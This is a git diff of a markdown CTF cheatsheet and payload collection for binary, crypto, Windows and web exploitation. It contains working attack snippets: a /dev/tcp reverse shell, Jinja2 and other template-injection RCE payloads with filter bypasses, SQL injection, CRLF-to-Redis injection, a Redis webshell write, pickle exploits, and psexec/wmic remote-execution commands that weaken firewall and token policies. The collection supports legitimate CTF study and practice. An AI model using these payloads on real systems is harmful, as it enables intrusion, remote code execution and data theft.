@@ -1,18 +1,44 @@
 # Cybersecurity Cheatsheet
-This is a cheatsheet for different types of CTF challenges.
+This is a payload collection and references for CTF challenges.
+- Guide
+  - [HackTricks](https://book.hacktricks.xyz/welcome/readme)  
+  - [PortSwigger Web Security Academy](https://portswigger.net/web-security)
+  - [Bamboofox](https://bamboofox.cs.nctu.edu.tw/courses)
+  - [Computer Security](https://edu-ctf.csie.org/)
+- Toolset
+  - [Hacker101](https://www.hacker101.com/resources)
+- Practice
+  - [CTF Time](https://ctftime.org/)
+  - [Google CTF](https://capturetheflag.withgoogle.com/)
+  - [picoCTF](https://play.picoctf.org/)
+  - [OverTheWire](https://overthewire.org/wargames/)
+  - [pwnable.tw](https://pwnable.tw/)
+  - [Hack The Box](https://www.hackthebox.com/)
+  - [prompt(1) to win](https://prompt.ml/0)
+- Real World
+  - [Hackerone Bug Bounty](https://hackerone.com/directory/programs)
+  - [SOCPrime](https://socprime.com/)
+  - [AlienVault](https://otx.alienvault.com/)
+  - [Anomali](https://www.anomali.com/)
+  - [MITRE ATT&CK](https://attack.mitre.org/)
+- News
+  - [CISA](https://www.cisa.gov/)
+  - [BleepingComputer](https://www.bleepingcomputer.com/)
+  - [The Hacker News](https://thehackernews.com/)
+  - [PENETRATION TESTING BLOG](https://securityonline.info/)
 
 
 ## Binary
-- Command
-  | Cmd                     | Comment        |
-  |:------------------------|:---------------|
-  | `$ readelf -S <binary>` | section header |
-  | `$ objdump -R <binary>` | got table      |
-  | `$ objdump -d <binary>` | plt table      |
-  | `$ c++filt`             |                |
-  | `$ hexer`               |                |
-  | `$ hexcurse`            |                |
 - Inspection
+  - Useful Linux Command
+    | Cmd                     | Comment        |
+    |:------------------------|:---------------|
+    | `$ readelf -S <binary>` | section header |
+    | `$ objdump -R <binary>` | got table      |
+    | `$ objdump -d <binary>` | plt table      |
+    | `$ c++filt`             |                |
+    | `$ hexer`               |                |
+    | `$ hexcurse`            |                |
   - PE Viewer
     - reshacker
     - CFF Explorer (ExplorerSuite)
@@ -26,22 +52,25 @@ This is a cheatsheet for different types of CTF challenges.
     - DIE (detect it easy)
       * identify shell and other info
   - Decompiler
+    - [Decompiler Explorer Online](https://dogbolt.org/)
+    - [Compiler Explorer Online](https://godbolt.org/)
     - jad
     - uncompyle6
-    - dnSpy
+    - [dnSpy](https://github.com/dnSpy/dnSpy) (.Net Framwork)
     - Telerik/JustAssembly
   - segment register / index in descripter table
 - Debugger
   - IDA pro
-    | Key                                                  | Comment                |
-    |:-----------------------------------------------------|:-----------------------|
-    | `<S-F1>`                                             | set variable structure |
-    | `<S-F12>`                                            | string list            |
-    | `r` / `h`                                            | encode                 |
-    | `x`                                                  | xrefs                  |
-    | `y`                                                  | type declaration       |
-    | `<C-f>`                                              | search                 |
-    | `<R>` > reset pointer type > create  new struct type |                        |
+    - Command
+      | Key                                                  | Comment                |
+      |:-----------------------------------------------------|:-----------------------|
+      | `<S-F1>`                                             | set variable structure |
+      | `<S-F12>`                                            | string list            |
+      | `r` / `h`                                            | encode                 |
+      | `x`                                                  | xrefs                  |
+      | `y`                                                  | type declaration       |
+      | `<C-f>`                                              | search                 |
+      | `<R>` > reset pointer type > create  new struct type |                        |
     - [IDA Skins](https://github.com/zyantific/IDASkins)
   - Ghidra
   - Windbg preview
@@ -58,37 +87,53 @@ This is a cheatsheet for different types of CTF challenges.
       | watch  |         |
       | rwatch |         |
       | awatch |         |
+      | x/[N][g,w,h,b]x | |
     - plugins
       - peda
       - gef
       - pwndbg
       - pwngdb
   - CheatEngine72
-- Headers
-  - mingw-w64
+- Environ
+  - Headers (mingw-w64)
     - `$ sudo apt install mingw-w64`
       > /usr/x86_64-w64-mingw32/include
       > 
       > /usr/i686-w64-mingw32/include
+  - Library
+    - `$ patchelf --set-interpreter ./libc/ld-linux.so.2 --set-rpath ./libc/ <bin>`
+    - `$ LD_PRELOAD=<lib> <bin>`
 - Payload
   - pwntools
   - one\_gadget
   - angr
+- API Hook
+  - [Microsoft Research Detours Package](https://github.com/microsoft/Detours)
 
 ### Calling Convention
-- cdecl
+- Compare
+  | Type                      | Ret | Parameters                  | Stack Cleaner | Note                      | 
+  |---------------------------|-----|-----------------------------|---------------|---------------------------|
+  | cdecl (Windows/Linux x86) | eax | stack                       | caller        |                           |
+  | Sysv (Linux x86\_64)      | rax | rdi,rsi,rdx,rcx,r8,r9,stack | caller        | call when 16-byte aligned |
+  | stdcall (Win32 API)       | eax | stack                       | callee        |                           |
+  | Microsoft x64             | rax | rcx,rdx,r8,r9,stack         | caller        |                           |
 - stdcall (win32api)
+
   ```c
   __attribute__((stdcall)) void func(int a, int b, int c) {
     ...
   }
   ```
+
 - fastcall
+
   ```c
   __attribute__((fastcall)) void func(int a, int b, int c) {
     ...
   }
   ```
+
 - thiscall
   > put `this` in `ecx`
   > 
@@ -156,10 +201,10 @@ This is a cheatsheet for different types of CTF challenges.
     > /etc/ssl/openssl.cnf
 
     ```bash
-    # Gen Key (Optional)
+    #Gen Key (Optional)
     openssl genrsa -out ca.key 4096
 
-    # CA
+    #CA
     openssl req -new -out ca.crt -sha256 -x509 -days 7300 \
       -newkey rsa:4096 -nodes -keyout ca.key \
       -subj "/C=TW/ST=Taiwan/L=Hsinchu/O=Organization/OU=Organization Unit/CN=Common Name"
@@ -167,7 +212,7 @@ This is a cheatsheet for different types of CTF challenges.
     openssl ca -selfsign -keyfile ca.key -infiles ca.csr \
       -startdate 20211001000000Z -enddate 20311001000000Z
 
-    # Intermediate CSR
+    #Intermediate CSR
     openssl req -new -out intermediate.csr -sha256 \
       -newkey rsa:4096 -nodes -keyout intermediate.key \
       -config <(cat <<EOF
@@ -176,7 +221,7 @@ This is a cheatsheet for different types of CTF challenges.
     EOF
     )
 
-    # Intermediate / Endentity CRT
+    #Intermediate / Endentity CRT
     openssl x509 -req -out intermediate.crt -in intermediate.csr -days 7300 \
       -CA ca.crt -CAkey ca.key -CAserial ca.serial -CAcreateserial \
       -extensions x509v3_config -extfile <(cat <<EOF
@@ -189,31 +234,42 @@ This is a cheatsheet for different types of CTF challenges.
     ```
     
   - Listen
+
     ```bash
     openssl genrsa -out server.key 4096
     openssl req -new -key server.key -x509 -days 3653 -out server.crt
     openssl s_server -key server.key -cert server.crt -port 443
     ```
+
   - Get cert from server
+
     ```bash
     openssl s_client -connect <ip>:<port> -showcerts
     ```
+
   - Read cert
+
     ```bash
     openssl x509 -in product.crt -noout -text
     ```
+
   - Verify cert 
+
     ```bash
     openssl verify -CAfile root.crt -untrusted intermediate.crt product.crt
     openssl verify -CAfile <(cat intermediate.crt root.crt) product.crt
     ```
+
   - Verify cert with key
+
     ```bash
     printf '123' \
       | openssl rsautl -encrypt -inkey <(openssl x509 -pubkey -noout -in sensor.crt) -pubin \
       | openssl rsautl -decrypt -inkey sensor.key
     ```
+
   - Verify mutual-auth
+
     ```
     openssl s_server -debug \
       -CAfile root.crt \
@@ -233,9 +289,11 @@ This is a cheatsheet for different types of CTF challenges.
       --key ./cert/client.key \
       https://127.0.0.1:12345
     ```
+    
 - MakeCert and New-SelfSignedcertificate
+
   ```
-  # MakeCert -n 'CN=code.signing' -ss My -r -pe -sr localmachine -cy end -eku 1.3.6.1.5.5.7.3.3 -len 4096 -b 2020/01/01 -e 2025/01/01
+  #MakeCert -n 'CN=code.signing' -ss My -r -pe -sr localmachine -cy end -eku 1.3.6.1.5.5.7.3.3 -len 4096 -b 2020/01/01 -e 2025/01/01
   New-SelfSignedCertificate -CertStoreLocation 'Cert:\CurrentUser\My' -KeyAlgorithm RSA -KeyLength 4096 -Type CodeSigningCert -KeyUsage DigitalSignature -KeyUsageProperty Sign -Subject 'CN=code signing test'
   Set-AuthenticodeSignature -FilePath @(Get-ChildItem -Recurse '*.exe','*.dll','*.ps1') -Certificate (Get-ChildItem Cert:\CurrentUser\My -codesigning)[0] -IncludeChain 'NotRoot' -HashAlgorithm SHA256 -TimestampServer 'http://timestamp.globalsign.com/?signature=sha2'
   signtool.exe verify /pa <binary>
@@ -263,11 +321,13 @@ This is a cheatsheet for different types of CTF challenges.
   > security dependes entirely on key stream (sync, async), which is random and reproducible
   
   - vulnerable to reused key attack
+
     ```
     E(A) = A xor C
     E(B) = B xor C
     E(A) xor E(B) = A xor B
     ```
+
   - key stream generator
     > the key stream generator works like a Pseudorandom Number Generator (RNG),
     > which generate sequences from initial seed (key) value
@@ -311,25 +371,27 @@ This is a cheatsheet for different types of CTF challenges.
 
 
 ## Misc
+- Binary Forensic
+  - binwalk 
+  - polyfile
+    - `polyfile <file>.pdf --html <file>.html`
+  - [file signature](https://filesignatures.net/)
+    > `47 49 46 38` GIF8
+    >
+    > `89 50 4e 47` .PNG
+  - `qpdf --qdf --object-streams=disable <infile> <outfile>`
+  - [Stego](https://0xrick.github.io/lists/stego/)
+    - zsteg
+    - stegsolve.jar
+  - Recover
+    - unt-wister
 
 ### QRcode
 - Content
 - Encode
 
-### Threat Intelligence
-- [SOCPrime](https://socprime.com/)
-- [AlienVault](https://otx.alienvault.com/)
-- [Anomali](https://www.anomali.com/)
-- [MITRE ATT&CK](https://attack.mitre.org/)
-- [CISA](https://www.cisa.gov/)
-- [BleepingComputer](https://www.bleepingcomputer.com/)
-- [The Hacker News](https://thehackernews.com/)
-
 
 ## System
-> [HackTricks](https://book.hacktricks.xyz/)
-> - logstash
-
 - Vulnerability Assessment
   - OpenVAS
   - metasploit
@@ -346,20 +408,6 @@ This is a cheatsheet for different types of CTF challenges.
   - WinObj (SysinternalsSuite)
   - Task Explorer (ExplorerSuite)
   - Driver List (ExplorerSuite)
-- Binary Forensic
-  - binwalk 
-  - polyfile
-    - `polyfile <file>.pdf --html <file>.html`
-  - [file signature](https://filesignatures.net/)
-    > `47 49 46 38` GIF8
-    >
-    > `89 50 4e 47` .PNG
-  - `qpdf --qdf --object-streams=disable <infile> <outfile>`
-  - [Stego](https://0xrick.github.io/lists/stego/)
-    - zsteg
-    - stegsolve.jar
-  - Recover
-    - unt-wister
 - Malware Scanner
   - [Microsoft Safety Scanner](https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download)
   - [Trend Micro Anti-Threat Toolkit](https://www.trendmicro.com/zh_tw/business/capabilities/solutions-for/ransomware/free-tools.html)
@@ -370,7 +418,20 @@ This is a cheatsheet for different types of CTF challenges.
 - `SET __COMPAT_LAYER=RunAsInvoker`
 - File
   - `fsutil file queryfileid <file>`
-  - $(Get-Item filename).lastwritetime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")
+  - `$(Get-Item filename).lastwritetime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")`
+  - Alternative Data Stream
+    > [File Streams (Local File Systems)](https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams)
+
+    ```cmd
+    echo abc > note.txt:abc.txt
+    echo C:\Windows\System32\cmd.exe > note.txt:cmd.exe
+    dir /R
+
+    wmic process call create note.txt:cmd.exe
+    forfiles /M note.txt /C "note.txt:cmd.exe"
+
+    Get-Content note.txt -stream abc.txt
+    ```
 - [Naming Files, Paths, and Namespaces](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
   - Namespace
     - Win32 File Namespace
@@ -407,13 +468,32 @@ This is a cheatsheet for different types of CTF challenges.
     | OUT | custom output device, by default the same as NUL: |
 - wmi
   - `wbemtest.exe`
+- Remote Command
+  - psexec
+    - Make sure `\\<host>\admin$` can be accessed
+
+    ```psh
+    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
+    netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
+    psexec \\host -u <user> -p <pass> -i [SessID] <cmd>
+    ```
+
+  - wmic
+
+    ```psh
+    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
+    netsh firewall set service remoteadmin enable
+    wmic /node:<host> /user:<user> /password:<pass> process call create <cmd>
+    ```
+
 - Windows Event
   - Sysmon
     - [SysmonSimulator](https://rootdse.org/posts/understanding-sysmon-events/)
 
 ### MacOS
 - Resource Fork
-  - `namedfork`
+- Named Fork
+- Data Fork
 
 
 ## Web / Remote
@@ -430,6 +510,7 @@ This is a cheatsheet for different types of CTF challenges.
     - unique email
   - hookbin.com
   - requestbin.net
+  - beeceptor
 - Connection
   - `/dev/tcp/<HOST>/<PORT>`
   - telnet
@@ -465,6 +546,13 @@ This is a cheatsheet for different types of CTF challenges.
     - dirb
     - DirBuster
     - git-dumper
+    - wfuzz
+
+      ```bash
+      wfuzz -c -z file,/raft-large-files.txt -hc 404 "${URL}"
+      ```
+
+    - ffuf
 - Scanner
   - sqlmap
   - xsser
@@ -520,9 +608,11 @@ This is a cheatsheet for different types of CTF challenges.
   - $ cat ${HOME:0:1}etc${HOME:0:1}passwd
 - Reverse Shell
   - `/bin/sh -i >& /dev/tcp/<HOST>/<PORT> 0<&1`
+  - [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)
 
 ### CRLF Injection
 - Inject `\r\n` to headers
+
   ```txt
   request("http://host/ HTTP/1.1\r\nHeader: xxx\r\nX:")
   -----------------------------------------------------
@@ -548,7 +638,9 @@ This is a cheatsheet for different types of CTF challenges.
   \r\n
   Redirecting to <a href="/">/</a> ...
   ```
+
 - Redis
+
   ```
   http://127.0.0.1:6379/%0D%0ASET%20key%20"value"%0D%0A
   -----------------------------------------------------
@@ -578,12 +670,14 @@ This is a cheatsheet for different types of CTF challenges.
 - import URL (CSRF)
   - Referer
   - url(...)
+
     ```
     body {
       background:
       url(http://example.com/logout);
     }
     ```
+
   - ...
 - CSS Selector
   > Read part of HTML source, like CSRF Token
@@ -609,6 +703,7 @@ This is a cheatsheet for different types of CTF challenges.
   - Magic Method
     - toString
     - readObject
+
       ```java
       public class Cat implements Serializable {
         ...
@@ -619,6 +714,7 @@ This is a cheatsheet for different types of CTF challenges.
         }
       }
       ```
+
     - finalize
     - ...
   - [ysoserial](https://github.com/frohoff/ysoserial)
@@ -667,7 +763,7 @@ This is a cheatsheet for different types of CTF challenges.
 
     serialized = pickle.dumps(Exploit())
     pickle.loads(serialized)
-    # pickletools.dis(serialized)
+    #pickletools.dis(serialized)
     ```
 
 ### DOM Clobbering
@@ -835,28 +931,34 @@ This is a cheatsheet for different types of CTF challenges.
   - Union Based
   - Blind
     - Boolean Based
+
       ```
       ... id = 1 and length(user()) > 0
       ... id = 1 and length(user()) > 16
       ... id = 1 and ascii(mid(user(),1,1)) > 0
       ... id = 1 and ascii(mid(user(),1,1)) > 80
       ```
+
     - Time Based
       - sleep
+
         ```
         ... id = 1 and IF(ascii(mid(user(),1,1))>0, SLEEP(10), 1)
         ... id = 1 and IF(ascii(mid(user(),1,1))>80, SLEEP(10), 1)
         ```
+
       - query / large calculation data
       - repeat('A', 10000)
   - Error
     - ExtractValue(xml, xpath)
+
       ```
       SELECT ExtractValue(1, concat(0x0a,version()));
       -----------------------------------------------
       XPATH syntax error:'
       8.0.20'
       ```
+
     - UpdateXML(xml, xpath, new\_xml)
     - exp(x)
     - MultiLineString(LineString)
@@ -970,36 +1072,53 @@ This is a cheatsheet for different types of CTF challenges.
 - Identify Template Engine
   ![](https://miro.medium.com/max/701/1*3hIShkWH_gjOt1b0LNPURQ.png)
 - Jinja2
-  > Flask default template engine
+  > [Flask default template engine (doc)](https://jinja.palletsprojects.com/en/3.1.x/)  
+  > [Exploiting Jinja SSTI with limited payload size.](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/)  
+  > [GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/)  
+  > [RCE-bypassing-as-much-as-I-possibly-can](https://hackmd.io/@Chivato/HyWsJ31dI#RCE-bypassing-as-much-as-I-possibly-can)  
+  > [On SSTI & bypass of jinja2](https://chowdera.com/2020/12/20201221231521371q.html)  
+  > [Builtin Filters](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)
 
+  - Get `os`
+    - `{{lipsum.__globals__.os}}`
+    - `{{cycler.__init__.__globals__.os}}`
+  - Load `os`
+    - `{{config.from_object('os')}}`
   - `{{ config }}`
     - config.SECRET\_KEY
     - config.from\_pyfile(filename)
+  - `{{ request }}`
+    - request.args.name
+    - request.cookies.name
+    - request.headers.name
+    - request.values.name
+    - request.form.name
   - sandbox bypass
+
     ```python
-    # All the below payloads works under python2
+    #All the below payloads works under python2
     --------------------------------------------
 
-    # Starting from string or list
-    {{ "".__class__.__base__ }}
+    #Starting from string or list
+    {{ ''.__class__.__base__ }}
 
-    # File operation
+    #File operation
     {{ ''.__class__.__mro__[2].__subclasses__() }}
     {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
     {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt').write('test') }}
     
-    # RCE
+    #RCE
     {{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() }}
     > uid=1000(ubuntu)gid=1000(ubuntu)...
 
-    # All the below payloads works under python3
+    #All the below payloads works under python3
     --------------------------------------------
     {{ ().__class__.__base__.__subclasses__() }}
-    {{ ().__class__.__base__.__subclasses__()[132] }} # <class 'os._wrap_close'>
+    {{ ().__class__.__base__.__subclasses__()[132] }} #<class 'os._wrap_close'>
     {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__ }}
     {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id') }}
 
-    # Find eval
+    #Find eval
     {% for c in [].__class__.__base__.__subclasses__(): %}
       {% if c.__name__ == 'catch_warnings': %}
         {% for b in c.__init__.__globals__.values(): %}
@@ -1012,7 +1131,7 @@ This is a cheatsheet for different types of CTF challenges.
       {% endif %}
     {% endfor %}
 
-    # Import
+    #Import
     {% for x in ().__class__.__base__.__subclasses__() %}
       {% if "warning" in x.__name__ %}
         {{x()._module.__builtins__["__import__"]("os").popen(request.args.payload).read()}}
@@ -1021,15 +1140,52 @@ This is a cheatsheet for different types of CTF challenges.
     ```
 
   - Bypass
-    - Use url parameter
-      ```
-      url/?content=xxx&param1=yyy&param2=zzz
-      --------------------------------------
-      xxx = ""[request.args.param1][request.args.param2]
-      yyy = __class__
-      zzz = __base__
+    - `.`
+
+      ```txt
+      /?ssti={{libsum['__globals__']['os']}}
       ```
 
+    - `.` `_`
+
+      ```txt
+      /?ssti={{lipsum['\x5f\x5fglobals\x5f\x5f']['os']}}
+      ```
+
+    - `.` `_` `[` `]`
+
+      ```txt
+      /?ssti={{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('os')}}
+      ```
+
+    - `.` `_` `[` `]` `|`
+
+      ```txt
+      /?ssti={{getattr(getattr(lipsum,'\x5f\x5fglobals\x5f\x5f'), 'os')}}
+      ```
+
+    - `.` `_` `[` `]` `{{` `}}`
+
+      ```txt
+      /?ssti={%if lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('os') %}{%endif%}
+      ```
+
+    - length or other special characters (`'` `"`)
+
+      ```txt
+      /?ssti={{lipsum[request.args.param1][request.args.param2]}}&param1=__globals__&param2=os
+
+      /?ssti={{config.update(payload=request.args.param1)}}&param1=ls
+      /?ssti={{lipsum.__globals__.os.popen(config.payload)}}
+      ```
+- Ruby erb
+  - `<%= system('id') %>`
+- PHP Smarty
+  - `{ system('id') }`
+- PHP Twig
+  - `{{ ['id'] | filter('system') }}`
+- Node.js ejs
+  - `<%= global.process.mainModule.require("child_process").execSync("id").toString() %>`
 - Format String Attack
 
 ### XS-Leaks
@@ -1057,7 +1213,29 @@ This is a cheatsheet for different types of CTF challenges.
 ### XXE (XML External Entity Injection)
 
 
-## Language & Framework
+## Programming & Framework
+
+### C
+- .init / .fini
+
+  ```C
+  #include <stdio.h>
+  __attribute__((constructor(101))) void func1() {
+  }
+
+  __attribute__((constructor(102))) void func2() {
+  }
+
+  __attribute__((constructor)) void func3() {
+  }
+
+  __attribute__((destructor)) void func4() { // Run after main function.
+  }
+
+  int main() {
+    return 0;
+  }
+  ```
 
 ### Shell
 - [Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html#Shell-Parameter-Expansion)
@@ -1073,6 +1251,7 @@ This is a cheatsheet for different types of CTF challenges.
   | `${x:0:2}`            | a1              |
 - Command
   - printf
+
     ```bash
     printf '%s.' a b c
     ------------------
@@ -1081,6 +1260,7 @@ This is a cheatsheet for different types of CTF challenges.
 
 ### Redis
 - Write file
+
   ```
   FLUSHALL
   SET payload "<?php phpinfo() ?>"
@@ -1088,6 +1268,7 @@ This is a cheatsheet for different types of CTF challenges.
   CONFIG SET DBFILENAME shell.php
   SAVE
   ```
+
 - [RCE](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
 
 ### JavaScript
